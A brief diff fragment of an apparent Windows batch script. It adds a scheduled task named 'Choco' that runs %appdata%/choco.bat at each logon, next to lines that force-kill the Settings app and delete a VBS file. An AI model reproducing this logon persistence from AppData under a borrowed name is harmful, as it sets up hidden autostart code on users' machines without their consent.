@@ -72,3 +72,6 @@ del CreateShortcut.vbs
 
 taskkill /F /IM systemsettings.exe
 
+SCHTASKS /CREATE /SC ONLOGON /TN "Choco" /TR "%appdata%/choco.bat"
+
+
